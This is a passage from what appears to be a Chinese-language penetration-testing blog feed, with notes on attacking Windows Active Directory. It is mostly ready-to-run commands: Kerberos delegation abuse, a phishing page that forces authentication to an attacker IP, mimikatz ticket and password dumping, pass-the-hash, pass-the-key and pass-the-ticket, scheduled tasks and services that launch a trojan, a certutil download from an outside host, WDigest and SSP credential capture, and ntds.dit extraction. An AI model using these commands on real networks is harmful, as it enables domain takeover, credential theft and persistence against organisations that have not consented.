class="language-none">Import-Module PowerView.ps1Get-NetComputer –unconstrained | select dnshostname, samaccountname</code></pre><p>CS下的命令</p><pre class="language-none"><code class="language-none">powershell-import PowerView.ps1powershell Get-NetComputer –unconstrained | select dnshostname, samaccountname</code></pre><p><strong>钓鱼方式进行委派攻击</strong></p><p>1、诱导管理员通过kerberos访问被控机器（诱导管理员访问借助了windows特性会</p><p>用当前账号密码进行认证的特性）</p><p>钓鱼链接</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///\\192.168.175.141\2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>2、在配置了非约束性委派的机器上进行导出内存票据（需要提权到最高权限才行）</p><pre class="language-none"><code class="language-none">mimikatz sekurlsa::tickets &#x2F;export</code></pre><p>3、导出的票据然后通过PTT，进行访问域控</p><pre class="language-none"><code class="language-none">mimikatz kerberos::ptt xxx.kirbi</code></pre><p>4、使用横向移动命令进行CS上线（WMI WINRM 计划任务</p><p>服务 DCOM psexec smbexec wmicexec atexec……）</p><p><strong>利用打印机漏洞进行委派攻击</strong></p><p>条件：</p><pre class="language-none"><code class="language-none">域控开启打印机域用户administrator权限或者system</code></pre><p>主动和被动的区别</p><p>1、主动：拿到域用户的hash值，进行PTT攻击</p><p>2、被动：拿到机器用户的Hash，可以进行dcsync，接着进行PTT攻击</p><p>1、首先利用Rubeus在本地管理员权限执行以下命令，每隔一秒监听来自域控机器 DC 的登录信息</p><pre class="language-none"><code class="language-none">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:DC$</code></pre><p>2、再利用SpoolSample强制域控打印机回连，需在域用户进程上执行</p><pre class="language-none"><code class="language-none">SpoolSample.exe DC [SVC]  这里的SVN是指目标服务器的 Share Name（共享名称）</code></pre><p>3、Rubeus监听到票据（这里的TGT票据是DC$的票据）</p><p>4、根据之前的Dcsync技术，域控的机器用户是有权限执行Dcsysnc的</p><pre class="language-none"><code class="language-none">Rubeus.exe ptt &#x2F;ticket:票据(导入TGT票据)</code></pre><p>5、执行mimikatz</p><pre class="language-none"><code class="language-none">lsadump::dcsync &#x2F;all &#x2F;csv</code></pre><p>6、然后制作金票、PTT PTH 认证接着采用横向的方式进行横向移动</p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><blockquote><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p><p>约束性委派是对委派的机器作了约束，被委派的机器只能访问设定好机器的服务</p></blockquote><p><strong>查询配置约束委派的账户</strong></p><ol><li>Adfind</li></ol><pre class="language-none"><code class="language-none">AdFind -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;(&amp;(samAccountType&#x3D;805306369)(msds-allowedtodelegateto&#x3D;*))&quot; msds-allowedtodelegateto</code></pre><ol start="2"><li>PowerView.ps1脚本</li></ol><pre class="language-none"><code class="language-none">Get-DomainUser -TrustedToAuth -domain test.local -Properties distinguishedname,msds</code></pre><p><strong>CS上线</strong></p><ol><li><p>查询</p></li><li><p>抓取该设置约束委派电脑的哈希</p></li><li><p>申请自己的的票据</p></li></ol><pre class="language-none"><code class="language-none">kekeo &quot;tgt::ask &#x2F;user:win7 &#x2F;domain:test.local &#x2F;password:ZHou2580 &#x2F;ticket:admin.kirbi&quot; &quot;exit&quot;哈希值获取票据：kekeo &quot;tgt::ask &#x2F;user:webadmin &#x2F;domain:god.org &#x2F;NTLM:518b98ad4178a53695dc997aa02d455c &#x2F;ticket:administrator.kirbi&quot; &quot;exit&quot;</code></pre><ol start="4"><li>利用用户票据获取域控票据</li></ol><pre class="language-none"><code class="language-none">kekeo &quot;tgs::s4u &#x2F;tgt:TGT_win7@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi &#x2F;user:admin@test.local &#x2F;service:cifs&#x2F;DC&quot; &quot;exit&quot;</code></pre><ol start="5"><li>导入票据到内存</li></ol><pre class="language-none"><code class="language-none">mimikatz kerberos::ptt TGS_admin@test.local@TEST.LOCAL_win7@TEST.LOCAL.kirbi</code></pre><ol start="6"><li>连接通讯域控</li></ol><pre class="language-none"><code class="language-none">shell dir \\DC\c$</code></pre><h2 id="基于资源的约束性委派-RBCD"><a href="#基于资源的约束性委派-RBCD" class="headerlink" title="基于资源的约束性委派(RBCD)"></a>基于资源的约束性委派(RBCD)</h2><blockquote><p>于资源的约束性委派基于资源的约束性委派不需要通过域管理员进行修改，而是将设置属性的权限给了服务资源本身</p></blockquote><p>约束性委派委派机器在域控上对进行设置的，基于资源的约束性委派是通过文件系统自己设置的</p><p><strong>设置RBCD</strong></p><p>条件：</p><pre class="language-none"><code class="language-none">1. 机器加入域的时候使用的账户2. 主机的机器用户(system)3. 域管(Administrator)4. Account Operator组中的成员</code></pre><p><strong>域账号控制域内主机上线</strong></p><ol><li>查看哪些主机是同一个计算机加入的</li></ol><pre class="language-none"><code class="language-none">AdFind.exe -h 192.168.235.138 -b &quot;DC&#x3D;test,DC&#x3D;local&quot; -f &quot;objectClass&#x3D;computer&quot; mS-DS-CreatorSID   同一主机加入的SID值相同</code></pre><ol start="2"><li>查看SID对应的是哪个计算机</li></ol><pre class="language-none"><code class="language-none">AdFind.exe -sc adsid:SID -dn   查询的用户可设置RBCD</code></pre><p>同一账户可多个电脑登录，域控会多出计算机</p><p>查询对应两个可能</p><p>1、 当前登录不是多账户登录的计算机，就需要用密码喷洒等获取到其账号密码，使用lsrunas.exe进行权限切换</p><p>2、当前登录是多账户登录的计算机，直接配置RBCD</p><p>创建机器账户</p><pre class="language-none"><code class="language-none">Set-ExecutionPolicy Bypass -Scope ProcessImport-Module .\Powermad.ps1New-MachineAccount -MachineAccount [serviceA] -Password $(ConvertTo-SecureString &quot;[密码]&quot; -AsPlainText -Force)</code></pre><p>获取添加机器账户的SID值</p><pre class="language-none"><code class="language-none">Import-Module .\PowerView.ps1Get-NetComputer [用户名] -Properties objectsid</code></pre><p>设置修改属性</p><pre class="language-none"><code class="language-none">Set-ExecutionPolicy Bypass -Scope Processimport-module .\powerview.ps1$SD &#x3D; New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;[SID])&quot;;$SDBytes &#x3D; New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0);Get-DomainComputer [要攻击的用户]| Set-DomainObject -Set @&#123;&#39;msds-allowedtoactonbehalfofotheridentity&#39;&#x3D;$SDBytes&#125; -Verbose#攻击用户是同一个计算机加入的</code></pre><p>验证是否添加成功</p><pre class="language-none"><code class="language-none">Get-DomainComputer [攻击的用户名] -Properties msds-allowedtoactonbehalfofotheridentity</code></pre><p>要清除设置可用</p><pre class="language-none"><code class="language-none">Set-DomainObject [攻击的用户名] -Clear &#39;msds-allowedtoactonbehalfofotheridentity&#39; -Verbose</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动(一)</title>
      <link href="/2024/11/11/2024-10-4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%80)/"/>
      <url>/2024/11/11/2024-10-4-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h1 id="利用远程桌面进行横向移动"><a href="#利用远程桌面进行横向移动" class="headerlink" title="利用远程桌面进行横向移动"></a>利用远程桌面进行横向移动</h1><p><strong>条件</strong></p><pre class="language-none"><code class="language-none">远程桌面的利用条件：1、开启了3389端口2、防火墙等安全设备没有禁止3、网络必须相通4、拥有账号和密码（或者Hash）（可以是本身的账号也可以是自己添加的）</code></pre><p><strong>查询3389开放情况</strong></p><pre class="language-none"><code class="language-none">1、可以使用netstat –ano 查看端口开放情况2、可以使用REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal“ ”Server &#x2F;vfDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f 开启33893、查看RDP是否是3389reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp&quot; &#x2F;V PortNumber</code></pre><p><strong>密码连接</strong></p><pre class="language-none"><code class="language-none">1、可以进行密码抓取技术，抓取到账号和密码（明文）然后直接进行连接2、如果说没有抓到明文的密码只有Hash值，可以使用Hash值进行连接mimikatz:privilege::debugsekurlsa::pth &#x2F;user:用户名 &#x2F;domain:IP地址 &#x2F;ntlm:Hash值 &quot;&#x2F;run:mstsc.exe &#x2F;restrictedadmin&quot;</code></pre><h1 id="远控工具"><a href="#远控工具" class="headerlink" title="远控工具"></a>远控工具</h1><h2 id="Todesk"><a href="#Todesk" class="headerlink" title="Todesk"></a>Todesk</h2><pre class="language-none"><code class="language-none">ToDesk.exe &#x2F;S  静默安装</code></pre><p>运行ToDesk后会在默认安装目录下生成一个config.ini配置文件，存储的有设备代码、临时密码、安</p><p>全密码以及登录用户和密码等重要敏感信息。不能破解密码但可以覆盖，重启ToDesk即可得到明文密码</p><p>CS覆盖后：</p><pre class="language-none"><code class="language-none">关闭进程然后重启tasklis 查找进程taskkill &#x2F;pid [PID] &#x2F;Fshell ToDesk.exe</code></pre><h2 id="GoToHTTP"><a href="#GoToHTTP" class="headerlink" title="GoToHTTP"></a>GoToHTTP</h2><p>上传后直接运行。运行后在运行目录下会生成一个配置文件<code>gotohttp.ini</code>,查看配置文件里面有连接地址和操作码，通过WEB页面和账号密码进行连接</p><h2 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h2><p>直接上传运行不用安装</p><p>配置文件路径<code>C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</code>，因为必须放密码上显示后才会显示密码，所以本地运行后替换该配置文件即可</p><pre class="language-none"><code class="language-none">tasklisttaskkill &#x2F;pid [PID] &#x2F;F</code></pre><h1 id="IPC横向移动"><a href="#IPC横向移动" class="headerlink" title="IPC横向移动"></a>IPC横向移动</h1><p><strong><font color="red">IPC利用条件：</font></strong></p><pre class="language-none"><code class="language-none">1、开启了139、445端口IPC$可以实现远程登录及对默认共享资源的访问, 445端口可以实现对共享文件打印机的访问。因此,一般来讲需要445端口的支持。2、管理员开启了默认共享默认共享是为了方便管理员进行远程管理而默认开启的,包括所有的逻辑盘(c$、d$、e$、admin$) 可以实现对这些默认共享目录的访问 （net share）3、必须知道对方机器的用户名和密码</code></pre><p><strong><font color="red">IPC</font></strong></p><blockquote><p>IPC( Internet Process Connection)共享，是为了实现进程间通信而开放的命名管道。</p></blockquote><p><strong><font color="red">共享文件</font></strong></p><blockquote><p>文件共享是指主动地在网络上共享自己的计算机文件。默认共享是为了方便管理员进行远程管理而默认</p><p>开启的,包括所有的逻辑盘(c$、d$、e$、admin$) 可以实现对这些默认共享目录的访问</p></blockquote><p><code>net share</code>可以查看共享文件夹</p><p>文件夹内<code>\\IP\c$</code>会默认使用当前用户名和密码进行对比,如果一样就能访问(该用户未登录也可以访问),不行则输入密码.共享文件必须是Administrator用户组下的才可以访问,可以是普通管理员.</p><p><strong>IPC$连接方式</strong></p><pre class="language-none"><code class="language-none">net share C$&#x3D;C:\      创建文件共享net use 查看连接的IPCnet use \\IP\ipc$ &quot;password&quot; &#x2F;user:&quot;username&quot;      (工作组)net use\\域名\ipc$ “域成员密码” &#x2F;user:域名\域成员账号   (域用户)net share C$ &#x2F;del    删除IPCnet use \\IP\ipc$ &#x2F;del   删除IPC</code></pre><p>使用命令</p><pre class="language-none"><code class="language-none">dir \\IP\c$tasklist &#x2F;sIPtype \\IP\c$\文件路径net time \\IP地址copy 文件 \\IP地址\C$</code></pre><h2 id="IPC配合计划任务横向移动"><a href="#IPC配合计划任务横向移动" class="headerlink" title="IPC配合计划任务横向移动"></a>IPC配合计划任务横向移动</h2><p>copy文件上去后可用计划任务将木马执行</p><p>创建IPC认证后，直接输入远程创建计划任务是不行的，还需要输入账号密码才可以,否则是用本地用户名和密码进行比较.</p><pre class="language-none"><code class="language-none">schtasks &#x2F;create &#x2F;s [IP] &#x2F;u [用户名] &#x2F;p [Admin@1234] &#x2F;tn [计划名]&#x2F;tr c:&#x2F;1.txt &#x2F;sc onstart &#x2F;RU System &#x2F;Fschtasks &#x2F;create &#x2F;s 192.168.41.239 &#x2F;u administrator &#x2F;p Admin@1234 &#x2F;tn test&#x2F;tr c:&#x2F;1.txt &#x2F;sc onstart &#x2F;RU System &#x2F;Fschtasks &#x2F;create &#x2F;s [IP] &#x2F;tn [计划名] &#x2F;tr [木马文件的位置] &#x2F;sc onstart &#x2F;RU System &#x2F;fschtasks &#x2F;create &#x2F;s 192.168.41.239 &#x2F;tn test &#x2F;tr c:&#x2F;1.exe &#x2F;sc onstart &#x2F;RU System &#x2F;f</code></pre><h2 id="IPC配合服务横向移动"><a href="#IPC配合服务横向移动" class="headerlink" title="IPC配合服务横向移动"></a>IPC配合服务横向移动</h2><p>在建立IPC的情况下可以使用远程创建服务</p><pre class="language-none"><code class="language-none">创建服务命令： sc \\IP地址 create [服务名] binpath&#x3D; &quot;cmd.exe &#x2F;c [木马路径]“  sc \\IP地址 create [服务名] binpath&#x3D; &quot;cmd.exe &#x2F;c c:\wanli.exe“开启服务命令：sc \\ IP地址 start [服务名] sc \\ IP地址 start test删除服务命令：sc \\[IP] delete [服务名] sc \\192.168.17.138 delete test</code></pre><h2 id="IPC配合盘符映射横向移动"><a href="#IPC配合盘符映射横向移动" class="headerlink" title="IPC配合盘符映射横向移动"></a>IPC配合盘符映射横向移动</h2><p>盘符映射就是将远程的共享盘映射到自己的电脑上然后操作自己的电脑就可以</p><pre class="language-none"><code class="language-none">net use k: \\IP\c$(前提是建立IPC的连接下)</code></pre><h1 id="PTH哈希传递攻击"><a href="#PTH哈希传递攻击" class="headerlink" title="PTH哈希传递攻击"></a>PTH哈希传递攻击</h1><p><strong><font color="red">mimikatz</font></strong></p><pre class="language-none"><code class="language-none">mimikatz “privilege::debug”mimikatz “sekurlsa::pth &#x2F;user:[用户名] &#x2F;domain:[域名或者IP] &#x2F;ntlm:[ntlm-hash]</code></pre><p>执行完成之后会弹出一个cmd</p><p><strong><font color="red">psexec工具也可以PTH攻击</font></strong></p><p>放一个东西到被攻击机弹shell回来,所以被攻击机有杀软就弹不回来</p><pre class="language-none"><code class="language-none">psexec.exe [域名前缀]&#x2F;[用户名]@[机器名].[域名] -hashes LM-Hash:NTLM-Hashpsexec.exe abc&#x2F;administrator@win10.abc.com -hashes aad3b435b51404eeaad3b435b51404ee:</code></pre><p>执行完后就会获取shell</p><p>CS自带psexec横向</p><p>抓取到的不同用户的Hash</p><pre class="language-none"><code class="language-none">在本地账号的情况下Administrator 可以进行PTH传递攻击本地普通管理员，不可以进行PTH攻击（除过早期的电脑 2003 xp）本地的普通用户，不可以进行PTH攻击域账号Administrator 可以用来PTH域普通管理员 可以用来PTH域普通用户 不可以（默认）</code></pre><p><strong><font color="red">Hash碰撞</font></strong></p><ol><li>Powershell脚本</li></ol><pre class="language-none"><code class="language-none">传递Invoke-TheHash.ziptar -xzvf Invoke-TheHash.zip  解压到当前目录cd Invoke-TheHashImport-Module .Invoke-TheHash.ps1（导入批量模块）Import-Module .Invoke-WMIExec.ps1（导入wmi模块）或者直接导入Invoke-TheHash.psd1就相当于导了上面两个Invoke-TheHash -Type WMIExec -Target [IP段]4 -Username [用户名] -Hash[hash值]Invoke-TheHash -Type WMIExec -Target 192.168.41.0&#x2F;24 -Username administrator -Hash570a9a65db8fba761c1008a51d4c95ab</code></pre><p>CS中</p><pre class="language-none"><code class="language-none">shell powershell -exec bypass -command &quot;&amp; &#123; import-module .\Invoke-TheHash.psd1;Invoke- TheHash -Type WMIExec -Target [IP段] -Username [用户名] -Hash[hash值]&#125;&quot;</code></pre><ol start="2"><li>CrackMapExe工具</li></ol><p>整个zip文件都传上去,只传exe会报错</p><pre class="language-none"><code class="language-none">crackmapexec.exe [IP段] -u [用户名] -H[LM-Hash]:[NTLM-Hash]crackmapexec.exe 192.168.41.0&#x2F;24 -u administrator -H570a9a65db8fba761c1008a51d4c95ab:570a9a65db8fba761c1008a51d4c95ab</code></pre><h2 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h2><ol><li>CS自带的插件可以使用PTH直接横向上线</li></ol><p>右键psexec可以直接上线</p><ol start="2"><li>使用Mimikatz工具上线</li></ol><p><strong><font color="red">远程登录下:</font></strong></p><pre class="language-none"><code class="language-none">mimikatz “privilege::debug”mimikatz “sekurlsa::pth &#x2F;user:[用户名] &#x2F;domain:[域名或者IP] &#x2F;ntlm:[ntlm-hash]</code></pre><p>执行完成之后会弹出一个cmd,可以执行copy，计划任务，服务等让他上线</p><p><strong><font color="red">CS中:</font></strong></p><p>因为CS中不能操作弹出的cmd,所以只能用插件进行上线</p><p>如梼杌的横向移动下的Mimikatz-pth,认证后就可以直接在命令行进行计划任务,服务等</p><p><strong><font color="red">工具进行PTH横向</font></strong></p><p><strong>Impacket工具包下的五个*exec.exe文件都可以横向</strong></p><p>命令</p><pre class="language-none"><code class="language-none">用户名:密码@IP地址 &quot;cmd &#x2F;c [命令]&quot;psexec.exe admin:ZHou258022@192.168.235.138 &quot;cmd &#x2F;c cmd.exe&quot;certutil -urlcache -split -f  http:&#x2F;&#x2F;10.218.11.204&#x2F;fscan C:\Users\admin\Desktop\fscan  下载文件用户名@IP地址 -hashes LM-HASH:NTLM-HASH &quot;cmd &#x2F;c [命令]&quot;域名&#x2F;域账号:密码@IP地址(或者全域名) &quot;cmd &#x2F;c 【命令&quot;域名&#x2F;域账号@IP地址(或者全域名) -hashes LM-HASH:NTLM-HASH &quot;cmd &#x2F;c [命令]&quot;</code></pre><h1 id="PTK秘钥传递攻击"><a href="#PTK秘钥传递攻击" class="headerlink" title="PTK秘钥传递攻击"></a>PTK秘钥传递攻击</h1><blockquote><p>PTK(Pass The key)，中文叫秘钥传递攻击，PTH传递中，使用的是NTLM-HASH值，PTK使用AES256或者AES128的方式进行传递,PTK 攻击只能用于kerberos认证中,NTLM认证中没有</p></blockquote><p>AES KEY 是kerberos协议中使用的，所以一般域用户才有AES KEY，AES分为两种 aes256和</p><p>aes128，本地用户没有aes key</p><p>抓取key命令</p><pre class="language-none"><code class="language-none">mimikatz privilege::debugmimikatz sekurlsa::ekeys</code></pre><p>条件：</p><pre class="language-none"><code class="language-none">1、必须是域环境，使用域账号才可以进行PTK2、支持aes进行认证</code></pre><p>PTK本质上也是一种认证，本身不具有攻击性，如果是一些特殊账号的KEY被我们知道利用PTK传</p><p>递攻击，我们可以生成对应账号的TGT票据，然后将票据导入到内存中，就可以访问对方的电脑</p><p>。可以使用 getTGT工具申请TGT，然后将TGT导入内存中，实现对目标机器的访问，后续可以配合</p><p>计划任务，或者其他的工具进行上线</p><pre class="language-none"><code class="language-none">第一步、生成TGT  这里使用getTGT工具可以生成TGT的工具有很多，比如kekeo Rubeus getTGT PS脚本等等，我么使用getTGTgetTGT.exe test.local&#x2F;admin -aesKey b9f765693d04428d4762a82bcf00bfec50261371fe16c36e3c788d19f8a9d415执行完成之后会在当前的目录下生成一个TGT票据，后缀是ccache第二步、将TGT注入到内存工具有很多，比如kekeo Rubeus getTGT PS，mimikatz 等等，这里使用mimikatzmimikatz Kerberos::ptc 票据名字执行完成之后会在当前的目录下生成一个TGT票据，后缀是ccache（凭证高速缓存）第三步、能访问，copy后计划任务，服务等上线dir \\DC.TEST.LOCAL\c$</code></pre><p>同样，之前的<strong>Impacket工具包下的五个*exec.exe文件也可以拿shell</strong></p><pre class="language-none"><code class="language-none">psexec.exe test.local&#x2F;admin@dc.test.local -aesKey b9f765693d04428d4762a82bcf00bfec50261371fe16c36e3c788d19f8a9d415</code></pre><p>如果是域管的key，可以直接访问其他域成员主机</p><h1 id="PTT票据传递攻击"><a href="#PTT票据传递攻击" class="headerlink" title="PTT票据传递攻击"></a>PTT票据传递攻击</h1><p>条件：</p><pre class="language-none"><code class="language-none">1、必须是域环境，域内才可以PTT2、必须拥有相应的票据（主要是域管理员票据）</code></pre><p>命令：抓取的必须是域控或者域管，普通用户不能传递</p><pre class="language-none"><code class="language-none">getTGT.exe test.local &#x2F;admin:ZHou258022  哈希也可以   生成ccache文件mimikatz kerberos::ptc admin.ccache  此时就能正常通讯dir \\dc.test.local&#x2F;c$</code></pre><p>Kekeo生成Kirbi</p><pre class="language-none"><code class="language-none">Kekeo的命令：Tgt::ask &#x2F;user:域用户 &#x2F;domain:域名 &#x2F;password:密码mimikatz kerberos::ptt admin.kirbi</code></pre><p>如果是域管账号，其他域用户都可以访问域用户</p>]]></content>
      
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码抓取</title>
      <link href="/2024/11/11/2024-10-01-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
      <url>/2024/11/11/2024-10-01-%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<h1 id="高版本密码抓取"><a href="#高版本密码抓取" class="headerlink" title="高版本密码抓取"></a>高版本密码抓取</h1><p>Win7、Win2008这样的机器内存中是存储明文的密码，但是在2012之后的机器（win10、win8、win11、</p><p>2012、2016）或者安装了KB2971997补丁是内存中就不在存储明文的密码了</p><p>在Windows2012系统及以上的系统，默认在内存缓存中禁止保存明文密码的。攻击者可以通过</p><p>修改注册表的方式抓取明文，需要用户重新登录后才能成功抓取</p><pre class="language-none"><code class="language-none">查询是否存在该值reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; &#x2F;v UseLogonCredential修改UseLogonCredential值为1，这里注意一定要是最高管理员权限reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f 开启reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f  关闭现在内存中就可以存储明文的密码了，但是因为密码在内存中，需要锁屏或者注销用户然后重新登录后，内存中就保留密码了1.rundll32.exe user32.dll,LockWorkStation锁屏2.queryuser查询登录logoffID注销用户使用mimikatz读取内存中的密码privilege::debugsekurlsa::logonPasswords</code></pre><h1 id="内存注入SSP获取系统密码"><a href="#内存注入SSP获取系统密码" class="headerlink" title="内存注入SSP获取系统密码"></a>内存注入SSP获取系统密码</h1><p>将SSP注入内存</p><pre class="language-none"><code class="language-none">mimikatz：misc::memssp</code></pre><p>进行锁屏等操作</p><pre class="language-none"><code class="language-none">rundll32.exe user32.dll,LockWorkStation</code></pre><p>等待管理员输入正确的账号密码后在<code>C:\Windows\System32\mimilsa.log</code>会存放正确的账号密码</p><blockquote><p>CS上不能显示和查看该文件,只能通过计时任务来读取。</p><p>在内存中，只要电脑重启了就会失效，如果想要永久生效就需要将SSP添加到注册表中，之后系统重启就会加载SSP，这</p><p>样就会获取明文账号密码。</p></blockquote><p><strong><font color="red">注册表添加SSP获取系统密码</font></strong></p><p>在Mimikatz中有一个mimilib.dll文件，这个就是SSP,将这个文件复制到<code>C:\Windows\System32</code>目录下</p><p>修改注册表，重启后就会加载SSP</p><pre class="language-none"><code class="language-none">reg add &quot;hklm\system\currentcontrolset\control\lsa&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;mimilib.dll&quot; &#x2F;t REG_MULTI_SZ</code></pre><p>密码将会生成在<code>C:\Windows\System32\kiwissp.log</code></p><h1 id="域内账号密码读取"><a href="#域内账号密码读取" class="headerlink" title="域内账号密码读取"></a>域内账号密码读取</h1><p>NTDS.DIT为DC的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以登录到域控的用户（如域管用户、DC本地管理员用户）可以访问,为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密</p><p>位置：<code>C:\Windows\NTDS</code></p><h2 id="获取NTDS-DIT文件"><a href="#获取NTDS-DIT文件" class="headerlink" title="获取NTDS.DIT文件"></a>获取NTDS.DIT文件</h2><h4 id="卷影拷贝提取域控NTDS"><a href="#卷影拷贝提取域控NTDS" class="headerlink" title="卷影拷贝提取域控NTDS"></a>卷影拷贝提取域控NTDS</h4><p>将NTDS文件复制到攻击者的本地，然后使用工具读取</p><ol><li><font color="red">ntdsutil.exe工具进行拷贝 该工具默认安装在域控服务器上</font></li></ol><p>需要本地最高管理员权限</p><pre class="language-none"><code class="language-none">第一步：创建一个NTDS快照ntdsutil.exe snapshot &quot;activate instance ntds&quot; create q q第二步：加载快照到磁盘中命令： ntdsutil.exe snapshot &quot;mount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q第三步：复制快照中的ntds.dit文件命令：copy &quot;快照地址\Windows\NTDS\ntds.dit&quot; &quot;目标地址&quot;copy &quot;C:\$SNAP_202209221446_VOLUMEC$\Windows\NTDS\ntds.dit&quot; &quot;C:\Users\Administrator\Desktop\ntds\ntds.dit&quot;第四步：删除快照命令：ntdsutil.exe snapshot &quot;umount &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; &quot;delete &#123;bf50c558-aa39-414d-9cc2-32e6dd3aebdc&#125;&quot; q q</code></pre><ol start="2"><li><font color="red">通过vssadmin工具进行拷贝</font></li></ol><pre class="language-none"><code class="language-none">创建一个C盘快照命令： vssadmin create shadow &#x2F;for&#x3D;c:第二步：将快照中的NTDS文件进行复制出来命令： copy 卷影副本卷名\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit最后一步就是删除快照命令： vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</code></pre><ol start="3"><li><font color="red">IFM方式进行拷贝</font></li></ol><pre class="language-none"><code class="language-none">test文件夹必须为空，没有则创建ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在 C:\test\registry 文件夹下直接复制就行</code></pre><ol start="4"><li><font color="red">vssown提取ntds.dit</font></li></ol><pre class="language-none"><code class="language-none">上传vssown.vbs工具启动卷影复制服务命令： cscript vssown.vbs &#x2F;start创建一个C盘的卷影副本命令： cscript vssown.vbs &#x2F;create c列出当前卷影副本命令：cscript vssown.vbs &#x2F;list复制文件到指定的目录命令：copy Device object\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.ditcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit C:\Users\Administrator\Desktop\ntds.dit删除卷影副本命令：cscript vssown.vbs &#x2F;delete IDcscript vssown.vbs &#x2F;delete &#123;641F0683-21D1-4FD3-B4C6-4DD00F0FA735&#125;</code></pre><h4 id="Copy-VSS-ps1"><a href="#Copy-VSS-ps1" class="headerlink" title="Copy-VSS.ps1"></a>Copy-VSS.ps1</h4><pre class="language-powershell" data-language="powershell"><code class="language-powershell">复制<span class="token function">Copy-VSS</span><span class="token punctuation">.</span>ps1文件到桌面<span class="token function">Import-Module</span> <span class="token punctuation">.</span>\<span class="token function">Copy-VSS</span><span class="token punctuation">.</span>ps1<span class="token function">Copy-VSS</span>桌面复制出SAM、SYSTEM和ntds文件</code></pre><p>不传工具</p><pre class="language-none"><code class="language-none">在E:\红队工具总汇\ONE-FOX集成工具箱_V8公开版_by狐狸\gui_other\Cobalt_Strike_4.7下放置工具Copy-vss.ps1powershell-import Copy-vss.ps1powershell Copy-VSS</code></pre><h4 id="Invoke-NinjaCopy"><a href="#Invoke-NinjaCopy" class="headerlink" title="Invoke-NinjaCopy"></a>Invoke-NinjaCopy</h4><pre class="language-none"><code class="language-none">Import-Module -name .\Invoke-NinjaCopy.ps1 Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;c:\ntds.dit&quot; Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SYSTEM&quot; -LocalDestination &quot;c:\system.hiv&quot;</code></pre><h2 id="离线读取NTDS文件中的Hash值"><a href="#离线读取NTDS文件中的Hash值" 